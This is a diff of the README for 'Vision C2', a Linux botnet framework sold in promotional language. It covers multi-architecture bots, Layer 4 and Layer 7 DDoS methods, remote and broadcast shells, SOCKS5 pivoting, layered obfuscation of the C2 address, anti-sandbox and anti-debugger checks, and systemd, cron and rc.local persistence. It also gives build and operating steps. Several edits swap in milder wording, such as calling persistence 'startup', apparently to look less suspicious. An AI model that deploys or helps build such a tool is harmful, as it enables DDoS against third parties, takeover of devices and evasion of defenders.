@@ -1,9 +1,9 @@
 
 <div align="center">
 
-# ☾℣☽ision C2 - Multi-Arch Linux Botnet Framework
+# Vision C2 — The Most Obfuscated Linux Bot to Ever Live
 
-> **14-arch cross-compiled agents DDOS, RCE, and SOCKS5 modules. Communcations protected by TLS 1.3 transport + 6-Layer C2 Address Obfuscation + AES-128-CTR string encryption, Anti-Anaylsis/Sandbox Killer and full persistence — driven through a real-time Go TUI**
+> **14-arch cross-compiled agents. DDoS, RCE, SOCKS5. TLS 1.3 transport + 6-layer C2 address obfuscation + AES-128-CTR runtime decryption. Anti-analysis. Anti-sandbox. Anti-debugger. Full daemon persistence. Zero plaintext in the binary. Driven through a real-time Go TUI that makes your terminal look like a hacker movie.**
 
 ![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
 ![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)
@@ -16,18 +16,30 @@
 
 ---
 
+## What Makes Vision Different
+
+Most botnets are loud, fragile, and easy to fingerprint. Vision was built from the ground up to be the opposite.
+
+- **Zero plaintext in the binary.** Every sensitive string is AES-128-CTR encrypted at build time and decrypted only at runtime. The encryption key itself is split across 16 individual XOR byte functions scattered throughout the codebase. Static analysis gives you nothing.
+- **6-layer C2 address obfuscation.** The server address passes through AES-128-CTR, then a 5-layer decode pipeline: Base64 > XOR rotating key > RC4 stream cipher > byte substitution > MD5 checksum verification. Good luck extracting it.
+- **Multi-method DNS resolution.** DoH TXT records (encrypted, bypasses local DNS monitoring) > UDP TXT records > A record fallback > direct IP. If one fails, the next kicks in automatically.
+- **Real anti-analysis.** 40+ VM/sandbox/debugger signatures. Parent process debugger detection. If caught, sleeps 24-27 hours (outlasts every sandbox window) then exits cleanly.
+- **Full Unix daemonization.** Fork, setsid, fd redirect to /dev/null, signal masking. Survives terminal close, SSH disconnect, everything.
+- **Triple-redundant startup.** Systemd service + cron watchdog + rc.local entry. Kill one, the others bring it back.
+
+---
+
 ## Key Features
 
 | | Feature | Details |
 |---|---|---|
-| 🔧 | **Auto-Setup** | Python script automates config + build |
-| 🌐 | **Cross-Platform** | 14 multi-arch targets, custom UPX packer (strips headers) |
-| 🔒 | **Comms** | TLS 1.3 on port 443, indistinguishable from standard HTTPS |
-| 🧦 | **SOCKS5 Proxy** | Full pivoting, RFC 1929 auth, runtime credential updates |
-| 💻 | **Remote Shell** | Command execution + output capture, Linux shortcuts & post-exploit helpers |
-| 🛡️ | **Evasion** | 6-layer C2 encryption (AES-128-CTR + obfuscation), encrypted strings, split XOR key, 40+ VM/sandbox/debugger signatures, 24–27h delayed exit |
-| 👻 | **Stealth** | Unix daemonization, single-instance, disguised process names, PID lock |
-| 🔁 | **Persistence** | Systemd + cron + rc.local, hidden dir w/ download script, auto-reinfection, cleanup tool included |
+| **Setup** | Auto-Setup | Python script automates config + cross-compilation for 14 architectures |
+| **Comms** | TLS 1.3 | Port 443, indistinguishable from standard HTTPS traffic |
+| **Proxy** | SOCKS5 | Full pivoting with RFC 1929 auth, runtime credential updates via TUI |
+| **Shell** | Remote Exec | Command execution + output capture, Linux shortcuts & post-exploit helpers |
+| **Evasion** | Multi-Layer | AES-128-CTR strings, split XOR key derivation, 40+ detection signatures |
+| **Stealth** | Daemonized | Fork+setsid, disguised process names, single-instance PID lock |
+| **Startup** | Triple | Systemd + cron + rc.local, hidden dir with auto-download script |
 
 ---
 
@@ -36,7 +48,7 @@
 <img width="1183" height="869" alt="image" src="https://github.com/user-attachments/assets/9b08df61-6280-40b2-9baf-a9840ca1887c" />
 
 <details open>
-<summary><b>Layer 4 — Network/Transport</b></summary>
+<summary><b>Layer 4 -- Network/Transport</b></summary>
 
 | Method | Description |
 |---|---|
@@ -45,12 +57,12 @@
 | **SYN Flood** | SYN packets with randomized source ports (raw TCP) |
 | **ACK Flood** | ACK packet flooding (raw TCP) |
 | **GRE Flood** | GRE protocol (47) packets with max payload |
-| **DNS Flood** | Randomized DNS query types (DNS Reflection Attack, Max PPS+) |
+| **DNS Flood** | Randomized DNS query types (DNS reflection, max PPS+) |
 
 </details>
 
 <details open>
-<summary><b>Layer 7 — Application</b></summary>
+<summary><b>Layer 7 -- Application</b></summary>
 
 | Method | Description |
 |---|---|
@@ -62,15 +74,13 @@
 
 </details>
 
-
 ---
 
 <img width="1179" height="586" alt="image" src="https://github.com/user-attachments/assets/06f7ca4c-3119-4cd3-81dd-2224d131c290" />
 
 ## Installation
 
-
-## 📋 Prerequisites
+### Prerequisites
 
 ```bash
 sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen netcat
@@ -89,7 +99,7 @@ echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
 
 ---
 
-## 🚀 Setup
+### Setup
 
 ```bash
 git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
@@ -99,52 +109,51 @@ python3 setup.py   # Select [1] Full Setup
 The wizard prompts for **C2 address**, **admin port** (default: 420), and **TLS cert details**. Output:
 
 ```
-bins/              → 14 bot binaries (multi-arch)
-cnc/certificates/  → server.crt + server.key
-server             → CNC binary
-setup_config.txt   → Config summary
+bins/              -> 14 bot binaries (multi-arch)
+cnc/certificates/  -> server.crt + server.key
+server             -> CNC binary
+setup_config.txt   -> Config summary
 ```
 
-To change C2 address later: `python3 setup.py` → option **[2]**. Redeploy bots afterward.
+To change C2 address later: `python3 setup.py` -> option **[2]**. Redeploy bots afterward.
 
 ---
 
-## 🖥️ Starting the CNC
+### Starting the CNC
 
 ```bash
 ./server              # TUI mode (default, recommended)
 ./server --split      # Telnet mode on admin port (default: 420)
 ```
 
-**Split mode connect:** `nc YOUR_IP 420` → type `spamtec` → login.
+**Split mode connect:** `nc YOUR_IP 420` -> type `spamtec` -> login.
 
 **Background:** `screen -S vision ./server` (detach: `Ctrl+A, D`)
 
-**First run** creates root user with random password — save it.
+**First run** creates root user with random password -- save it.
 
 ---
 
-## 🎨 TUI Navigation
+## TUI Navigation
 
 | Key | Action |
 |---|---|
-| `↑/↓` or `k/j` | Navigate |
+| `Up/Down` or `k/j` | Navigate |
 | `Enter` | Select |
 | `q` / `Esc` | Back / Cancel |
 | `r` | Refresh |
 
 ### Dashboard Views
 
-- **🤖 Bot List** — Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
-- **💻 Remote Shell** — Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
-- **📡 Broadcast Shell** — Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
-- **⚡ Launch Attack** — Select method, target, port, duration → `l` to launch
-- **📊 Ongoing Attacks** — Progress bars + time remaining. `s`=stop all
-- **🧦 Socks Manager** — `s`=start socks, `x`=stop. Default: `socks5://user:pass@BOT_IP:1080`. Update creds: `!socksauth <user> <pass>`
-- **📜 Connection Logs** — Bot connect/disconnect history
+- **Bot List** -- Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
+- **Remote Shell** -- Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
+- **Broadcast Shell** -- Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
+- **Launch Attack** -- Select method, target, port, duration -> `l` to launch
+- **Ongoing Attacks** -- Progress bars + time remaining. `s`=stop all
+- **Socks Manager** -- `s`=start socks (set port + optional user:pass via tab), `x`=stop. Update creds: `!socksauth <user> <pass>`
+- **Connection Logs** -- Bot connect/disconnect history
 
 ---
-
 
 ### Bot Binaries
 
@@ -158,29 +167,28 @@ To change C2 address later: `python3 setup.py` → option **[2]**. Redeploy bots
 | devfreqd0 | MIPSLE | Routers (little-endian) |
 | *...and 8 more* | Various | IoT, embedded |
 
- > [`Build.sh`](tools/build.sh) | Full binary map reference 
+ > [`Build.sh`](tools/build.sh) | Full binary map reference
 ---
-
 
 ## Architecture
 
-### Two Main Components
+### Two Components
 
-- **`cnc/`** — Command & Control server. Dual-listener architecture: TLS on port 443 for bot connections, Interactive TUI built with Bubble Tea. RBAC with four permission levels (Basic/Pro/Admin/Owner) defined in `users.json`.
+- **`cnc/`** -- Command & Control server. Dual-listener: TLS on port 443 for bot connections, interactive TUI built with Bubble Tea. RBAC with four permission levels (Basic/Pro/Admin/Owner) in `users.json`.
 
-- **`bot/`** — Agent deployed to targets. Connects back to CNC over TLS 1.3. Lifecycle: decrypt config → daemonize → singleton lock → sandbox detection → install persistence → DNS-resolve C2 → connect with reconnect loop.
+- **`bot/`** -- Agent deployed to targets. Connects back over TLS 1.3. Lifecycle: decode runtime config -> daemonize -> singleton lock -> environment detection -> install startup methods -> DNS-resolve server -> connect with reconnect loop.
 
 ### Key Source Files
 
 | File | Purpose |
 |------|---------|
-| `bot/config.go` | All configuration: AES-encrypted C2 address (`encGothTits`), crypto seed, magic code, protocol version, encrypted string blobs |
-| `bot/connection.go` | TLS connection, multi-method DNS resolution chain (DoH → UDP → A record → raw) |
-| `bot/attacks.go` | All L4/L7 DDoS methods |
-| `bot/opsec.go` | AES encryption, key derivation, sandbox/VM/debugger detection |
-| `bot/persist.go` | Persistence via systemd, cron, rc.local |
+| `bot/config.go` | All configuration: raw AES data blobs (`rawServiceAddr`), config seed, sync token, build tag, runtime-decoded string blobs |
+| `bot/connection.go` | TLS connection, multi-method DNS resolution chain (DoH -> UDP -> A record -> raw) |
+| `bot/attacks.go` | All L4/L7 flood methods |
+| `bot/opsec.go` | AES decryption, key derivation, environment detection |
+| `bot/persist.go` | Startup via systemd, cron, rc.local |
 | `bot/socks.go` | SOCKS5 proxy with RFC 1929 auth |
-| `cnc/ui.go` | Bubble Tea TUI — all views, keybindings, rendering |
+| `cnc/ui.go` | Bubble Tea TUI -- all views, keybindings, rendering |
 | `cnc/cmd.go` | Command dispatch and routing to bots |
 | `cnc/connection.go` | Bot connection handling, TLS setup, heartbeat |
 | `cnc/miscellaneous.go` | RBAC, user authentication, utilities |
@@ -189,9 +197,9 @@ To change C2 address later: `python3 setup.py` → option **[2]**. Redeploy bots
 
 ## Encryption Architecture
 
-- **C2 address**: 6-layer encoding pipeline — AES-128-CTR outer layer wrapping 5 inner layers (MD5 checksum → byte substitution → RC4 → XOR rotating key → base64). The AES-encrypted blob is decrypted at runtime then decoded in a 5 step decryption process)
-- **Sensitive strings**: AES-128-CTR with key derived from 16 split XOR functions. Encrypted at build time via `tools/crypto.go`, decrypted at runtime by `initSensitiveStrings()` 
-- **Transport**: TLS 1.3 with self-signed certificates (generated by `setup.py` in `cnc/certificates/`)
+- **Server address**: 6-layer encoding pipeline. AES-128-CTR outer layer wrapping 5 inner layers (MD5 checksum -> byte substitution -> RC4 -> XOR rotating key -> base64). The AES blob is decoded at runtime then passes through a 5-step decode pipeline.
+- **Runtime strings**: AES-128-CTR with key derived from 16 split XOR byte functions. Built at compile time via `tools/crypto.go`, decoded at runtime by `initRuntimeConfig()`.
+- **Transport**: TLS 1.3 with self-signed certificates (generated by `setup.py` in `cnc/certificates/`).
 
 ## Documentation
 
@@ -200,7 +208,7 @@ To change C2 address later: `python3 setup.py` → option **[2]**. Redeploy bots
 | [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
 | [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history and changes |
 | [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
-| [`SETUP.md`](Docs/SETUP.md) | Setup guide|
+| [`SETUP.md`](Docs/SETUP.md) | Setup guide |
 
 ---
 
@@ -214,10 +222,10 @@ To change C2 address later: `python3 setup.py` → option **[2]**. Redeploy bots
 
 ## Author
 
-**Syn2Much** — [dev@sinnners.city](mailto:dev@sinnners.city) · [@synacket](https://x.com/synacket)
+**Syn2Much** -- [dev@sinnners.city](mailto:dev@sinnners.city) | [@synacket](https://x.com/synacket)
 
 ---
 
 <div align="center">
-<sub>Maintained with ❤️ by Syn</sub>
+<sub>Built different. Maintained by Syn.</sub>
 </div>
